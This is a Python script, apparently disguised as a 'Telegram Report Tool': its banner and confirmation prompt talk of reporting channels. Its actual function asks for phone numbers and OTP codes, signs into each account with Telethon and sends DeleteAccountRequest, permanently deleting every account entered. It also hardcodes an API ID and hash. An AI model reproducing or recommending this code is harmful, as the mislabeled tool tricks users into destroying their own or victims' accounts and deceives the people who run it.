import os
import sys
from telethon import TelegramClient
from telethon import functions
import asyncio

# কালার কোড
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

# API credentials (pre-configured)
API_ID = 26108693
API_HASH = "3bc54f318fb35b9d82c3f885f18e7028"

def print_banner():
    banner = f"""
    {BLUE}
    ████████╗███████╗██╗     ███████╗ ██████╗ ██████╗  █████╗ ███╗   ███╗
    ╚══██╔══╝██╔════╝██║     ██╔════╝██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
       ██║   █████╗  ██║     █████╗  ██║  ███╗██████╔╝███████║██╔████╔██║
       ██║   ██╔══╝  ██║     ██╔══╝  ██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
       ██║   ███████╗███████╗███████╗╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
       ╚═╝   ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
    
    {YELLOW}Telegram Report Tool{RESET}
    {RED}⚠️ Warning: This action is irreversible! ⚠️{RESET}
    {GREEN}API ID: **********{RESET}
    {GREEN}API Hash: *****************************{RESET}
    """
    print(banner)

async def delete_telegram_account(phone_number):
    try:
        client = TelegramClient(f'session_{phone_number}', API_ID, API_HASH)
        
        await client.connect()
        
        if not await client.is_user_authorized():
            # Send code request
            await client.send_code_request(phone_number)
            code = input(f"{YELLOW}Enter the OTP code sent to {phone_number}: {RESET}")
            
            # Sign in with the code
            await client.sign_in(phone_number, code)
        
        # Delete account
        print(f"{RED}[!] Attempting to delete account {phone_number}...{RESET}")
        result = await client(functions.account.DeleteAccountRequest(
            reason="Personal choice"
        ))
        
        if result:
            print(f"{GREEN}[+] Account {phone_number} has been successfully deleted!{RESET}")
        else:
            print(f"{RED}[-] Failed to delete account {phone_number}{RESET}")
            
        await client.disconnect()
        
    except Exception as e:
        print(f"{RED}[-] Error: {str(e)}{RESET}")

def main():
    print_banner()
    
    try:
        print(f"\n{YELLOW}[?] Enter your phone numbers  (comma separated):{RESET}")
        phones_input = input(f"{BLUE}Phone numbers: {RESET}")
        phone_numbers = [phone.strip() for phone in phones_input.split(",")]
        
        confirmation = input(f"\n{RED}⚠️  Channel reportet {len(phone_numbers)} account(s)? This cannot be undone! (y/n): {RESET}")
        
        if confirmation.lower() != 'y':
            print(f"{YELLOW}Operation cancelled.{RESET}")
            return
        
        for phone in phone_numbers:
            print(f"\n{GREEN}[+] Processing account: {phone}{RESET}")
            asyncio.run(delete_telegram_account(phone))
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Operation cancelled by user.{RESET}")
    except Exception as e:
        print(f"{RED}[-] An error occurred: {str(e)}{RESET}")

if __name__ == "__main__":
    main()
